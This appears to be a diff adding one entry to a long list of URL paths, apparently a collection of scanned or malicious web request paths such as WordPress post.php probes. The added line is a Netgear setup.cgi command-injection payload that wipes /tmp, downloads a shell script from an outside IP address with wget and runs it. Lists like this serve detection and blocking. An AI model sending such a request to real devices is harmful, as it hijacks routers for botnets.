@@ -11574,3 +11574,4 @@ http://www.ip138.com/
 /wp-admin/css/post.php
 /wp-content/upgrade/post.php
 /wp-admin/post.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://185.132.125.229/bins.sh+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
